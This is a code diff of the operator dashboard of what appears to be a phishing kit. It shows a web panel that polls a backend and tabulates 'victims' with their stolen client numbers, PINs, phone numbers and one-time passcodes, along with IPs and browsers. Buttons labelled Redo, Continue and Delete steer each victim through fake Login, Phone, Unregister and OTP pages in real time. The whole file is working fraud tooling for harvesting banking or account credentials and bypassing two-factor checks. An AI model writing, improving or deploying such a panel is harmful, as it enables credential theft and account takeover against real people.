@@ -16,7 +16,6 @@
       --text-muted: #8b8b8b;
       --green: #34d399;
       --red: #fb7185;
-      --accent: #ff6600;
       --radius: 18px;
     }
     * { box-sizing: border-box; font-family: InterVariable, Inter, system-ui, sans-serif; }
@@ -33,66 +32,33 @@
     table { width: 100%; font-size: .9rem; border-collapse: collapse; margin-top: 1rem; }
     th { text-align: left; padding: .6rem .5rem; border-bottom: 1px solid #e5e5e5; font-weight: 500; font-size: .8rem; text-transform: uppercase; color: #555; }
     td { padding: .6rem .5rem; border-bottom: 1px solid #f0f0f0; }
-    tr:hover { background: transparent; } /* no white flash */
-    button { padding: .25rem .6rem; font-size: .8rem; border: 0; border-radius: 4px; cursor: pointer; margin: 0 2px; background: rgba(255,255,255,.08); color: var(--text-primary); }
-    button:hover { background: rgba(255,255,255,.14); }
-    .btn-accent { background: var(--accent); color: #fff; }
-    .btn-accent:hover { background: #e55a00; }
+    tr:hover { background: #fafafa; }
+    button { padding: .25rem .6rem; font-size: .8rem; border: 0; border-radius: 4px; background: #007bff; color: #fff; cursor: pointer; margin: 0 2px; }
+    button:hover { background: #0056b3; }
     .cred { font-family: monospace; font-size: .8rem; background: #f1f1f1; padding: 2px 4px; border-radius: 3px; }
     .detail { font-size: 12px; color: var(--text-muted); }
     #modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,.75); align-items: center; justify-content: center; }
     #modal .card { max-width: 500px; width: 90%; background: #111; border-color: #333; }
     #empty { text-align: center; color: #888; padding: 2rem 0; }
-    .tab-row { display: flex; gap: 12px; margin-bottom: 12px; }
-    .tab { padding: 6px 14px; font-size: 12px; font-weight: 500; letter-spacing: 0.16em; text-transform: uppercase; border-radius: 999px; cursor: pointer; background: rgba(255,255,255,0.08); color: var(--text-muted); }
-    .tab.active { background: #fff; color: #000; }
-    .notify-badge { position: absolute; top: 12px; right: 12px; background: var(--accent); color: #fff; font-size: 10px; padding: 2px 6px; border-radius: 999px; display: none; }
     @media (max-width: 900px) { .stats { grid-template-columns: 1fr; } }
   </style>
 </head>
 <body>
   <div class="dashboard">
-    <!-- =====  HEADER  ===== -->
-    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:22px">
-      <div style="font-size:14px;font-weight:500"><span id="greeting">Hello, — • —</span></div>
-      <a href="/panel/logout" style="font-size:13px;color:var(--text-muted)">Logout</a>
-    </div>
-
-    <!-- =====  TABS  ===== -->
-    <div class="tab-row">
-      <div class="tab active" onclick="switchTab('active')">Active</div>
-      <div class="tab" onclick="switchTab('success')">Successful</div>
-    </div>
-
-    <!-- =====  STATS  ===== -->
     <div class="grid stats">
       <div class="card"><div class="stat-label">Active Sessions</div><div class="stat-value" id="active">—</div></div>
-      <div class="card"><div class="stat-label">Visits (total)</div><div class="stat-value" id="visits">—</div></div>
-      <div class="card clickable" id="successCard" onclick="switchTab('success')">
-        <div class="stat-label">Successful Logins</div>
-        <div class="stat-value" id="success">—</div>
-      </div>
+      <div class="card"><div class="stat-label">Total Victims</div><div class="stat-value" id="total">—</div></div>
+      <div class="card"><div class="stat-label">Successful Logins</div><div class="stat-value" id="success">—</div></div>
     </div>
 
-    <!-- =====  TABLE CARD  ===== -->
-    <div class="card" style="margin-top:22px;position:relative">
+    <div class="card" style="margin-top:22px;">
       <div style="font-size:14px;font-weight:600;margin-bottom:12px;">
-        <span id="tableTitle">Active Sessions</span> · <a id="domainLink" href="#" target="_blank" style="color:#007bff;text-decoration:none;"></a>
+        Active Sessions · <a id="domainLink" href="#" target="_blank" style="color:#007bff;text-decoration:none;"></a>
       </div>
-      <span id="unregBadge" class="notify-badge">Unregister clicked</span>
       <table id="tbl"><thead><tr>
         <th>#</th><th>Client</th><th>PIN</th><th>Phone</th><th>OTP</th><th>IP</th><th>Platform</th><th>Browser</th><th>Page</th><th></th>
       </tr></thead><tbody></tbody></table>
       <div id="empty">No active sessions</div>
-    </div>
-
-    <!-- =====  SUCCESS LIST  ===== -->
-    <div class="card" id="successCard" style="margin-top:22px;display:none">
-      <div style="font-size:14px;font-weight:600;margin-bottom:12px;">Successful Logins</div>
-      <table id="successTbl"><thead><tr>
-        <th>#</th><th>Client</th><th>PIN</th><th>Phone</th><th>OTP</th><th>IP</th><th>Platform</th><th>Browser</th><th>When</th><th></th>
-      </tr></thead><tbody></tbody></table>
-      <div id="successEmpty">No successful logins yet</div>
     </div>
   </div>
 
@@ -104,64 +70,45 @@
       </div>
       <div id="modalBody" style="margin-top:1rem;font-size:13px;line-height:1.6"></div>
       <div style="margin-top:1rem;display:flex;gap:8px">
-        <button onclick="closeModal()">Close</button>
+        <button id="redoBtn"  onclick="act('redo',  currentSid)">🔁 Redo</button>
+        <button id="contBtn"  onclick="act('cont',  currentSid)">✅ Continue</button>
+        <button onclick="act('delete',currentSid)" style="background:#dc3545">🗑 Delete</button>
       </div>
     </div>
   </div>
 
   <script>
-    /* ----------  GLOBALS  ---------- */
-    let jsonData = {};
     let currentSid = null;
-    let unregisterAlert = false;
     const qs = s => document.querySelector(s);
-
-    /* ----------  CLOCK & GREETING  ---------- */
-    function updateClock(){
-      const now = new Date();
-      const h = now.getHours(), m = now.getMinutes().toString().padStart(2,'0');
-      const ampm = h>=12?'pm':'am';
-      const hh = (h%12||12).toString().padStart(2,'0');
-      qs('#greeting').textContent = `Hello, ${jsonData.userName||'Admin'}! • ${hh}:${m}${ampm}`;
-    }
-    setInterval(updateClock,1000); updateClock();
-
-    /* ----------  TABS  ---------- */
-    function switchTab(which){
-      document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
-      document.querySelector(`.tab:nth-child(${which==='active'?1:2})`).classList.add('active');
-      qs('#activeCard').style.display = which==='active' ? 'block' : 'none';
-      qs('#successCard').style.display = which==='success' ? 'block' : 'none';
-      qs('#tableTitle').textContent = which==='active' ? 'Active Sessions' : 'Successful Logins';
-      renderTable();
-    }
 
     /* ----------  PAGE TITLE MAPPER  ---------- */
     function pageTitle(file){
       switch(file){
         case 'index.html':    return 'Login';
-        case 'verify.html':   return 'Phone';
+        case 'verify.html':   return 'Phone number';
         case 'unregister.html':return 'Unregister';
         case 'otp.html':      return 'OTP';
         default:              return file;
       }
     }
 
-    /* ----------  RENDER TABLE  ---------- */
-    function renderTable(){
+    /* ----------  RENDER  ---------- */
+    function render(d){
+      qs('#active').textContent   = d.active;
+      qs('#total').textContent    = d.totalVictims;
+      qs('#success').textContent  = d.success;
+
+      /* clickable domain next to "Active Sessions" */
+      const domainLink = qs('#domainLink');
+      domainLink.textContent = d.domain || 'localhost';
+      domainLink.href        = d.domain || 'http://localhost';
+
       const body = qs('#tbl tbody');
       const empty= qs('#empty');
-      const arr  = qs('#activeCard').style.display==='none' ? successLog : jsonData.sessions||[];
-      if(!arr.length){ body.innerHTML=''; empty.style.display='block'; return; }
+      if(!d.sessions.length){ body.innerHTML=''; empty.style.display='block'; return; }
       empty.style.display='none';
-      body.innerHTML = arr.map(s=>{
-        const actions = [];
-        if (qs('#activeCard').style.display!=='none' && s.status==='wait' && s.page!=='success') {
-          if (s.entered) actions.push(`<button class="btn-accent" onclick="act('redo','${s.sid}')">🔁</button><button class="btn-accent" onclick="act('cont','${s.sid}')">✅</button>`);
-          if (s.unregisterClicked) actions.push(`<button class="btn-accent" onclick="act('cont','${s.sid}')">✅</button>`);
-        }
-        actions.push(`<button class="btn-accent" onclick="showDetail('${s.sid}')">Manage</button>`);
-        return `<tr>
+      body.innerHTML = d.sessions.map(s=>`
+        <tr>
           <td>${s.victimNum}</td>
           <td><span class="cred">${s.email||'—'}</span></td>
           <td><span class="cred">${s.password||'—'}</span></td>
@@ -171,30 +118,18 @@
           <td>${s.platform}</td>
           <td>${s.browser}</td>
           <td>${pageTitle(s.page)}</td>
-          <td>${actions.join('')}</td>
-        </tr>`;
-      }).join('');
+          <td><button onclick="showDetail('${s.sid}')">Manage</button></td>
+        </tr>`).join('');
     }
 
-    /* ----------  STATS BAR  ---------- */
-    function renderStats(){
-      qs('#active').textContent  = (jsonData.sessions||[]).length;
-      qs('#visits').textContent  = jsonData.totalVisits||jsonData.totalVictims||'—';
-      qs('#success').textContent = jsonData.success||'—';
-      const domainLink = qs('#domainLink');
-      domainLink.textContent = jsonData.domain||'localhost';
-      domainLink.href        = jsonData.domain||'http://localhost';
-    }
-
-    /* ----------  DETAIL MODALS  ---------- */
+    /* ----------  DETAIL MODAL  ---------- */
     function showDetail(sid){
-      const pool = qs('#activeCard').style.display==='none' ? successLog : jsonData.sessions||[];
-      const s = pool.find(x=>x.sid===sid); if(!s)return;
+      const s = jsonData.sessions.find(x=>x.sid===sid);
+      if(!s)return;
       currentSid = sid;
-      const dateStr = new Date(s.dateStr).toLocaleString(undefined,{timeZoneName:'short'});
       qs('#modalBody').innerHTML = `
         <div class="detail">Session ID</div><div class="cred">${s.sid}</div>
-        <div class="detail">Client</div><div class="cred">${s.email||'—'}</div>
+        <div class="detail">Client number</div><div class="cred">${s.email||'—'}</div>
         <div class="detail">PIN</div><div class="cred">${s.password||'—'}</div>
         <div class="detail">Phone</div><div class="cred">${s.phone||'—'}</div>
         <div class="detail">OTP</div><div class="cred">${s.otp||'—'}</div>
@@ -203,8 +138,10 @@
         <div class="detail">Browser</div><div>${s.browser}</div>
         <div class="detail">Page</div><div>${pageTitle(s.page)}</div>
         <div class="detail">User-Agent</div><div style="word-break:break-all">${s.ua}</div>
-        <div class="detail">Date</div><div>${dateStr}</div>`;
-      qs('#modal').style.display='flex';
+        <div class="detail">Date</div><div>${s.dateStr}</div>`;
+      qs('#redoBtn').style.display  = s.page==='success' ? 'none':'inline-block';
+      qs('#contBtn').style.display  = s.page==='success' ? 'none':'inline-block';
+      qs('#modal').style.display    = 'flex';
     }
     function closeModal(){ qs('#modal').style.display='none'; }
 
@@ -214,28 +151,13 @@
       closeModal(); load();
     }
 
-    /* ----------  ALERT ON UNREGISTER  ---------- */
-    let lastUnregister=[];
-    function checkUnregister(){
-      const now = (jsonData.sessions||[]).filter(s=>s.page==='unregister.html').map(s=>s.sid);
-      const news = now.filter(id=>!lastUnregister.includes(id));
-      if(news.length) alert('⚠️  Victim clicked “Unregister” – review session!');
-      lastUnregister=now;
-    }
-
     /* ----------  POLL  ---------- */
+    let jsonData = {};
     async function load(){
       jsonData = await fetch('/api/panel').then(r=>r.json());
-      successLog = await fetch('/api/success-log').then(r=>r.json()).catch(()=>[]);
-      renderStats();
-      renderTable();
-      checkUnregister();
-      updateClock();
+      render(jsonData);
     }
     load(); setInterval(load,2000);
-
-    /* ----------  NOTIFICATION PERMISSION  ---------- */
-    if ('Notification' in window && Notification.permission === 'default') Notification.requestPermission();
   </script>
 </body>
 </html>
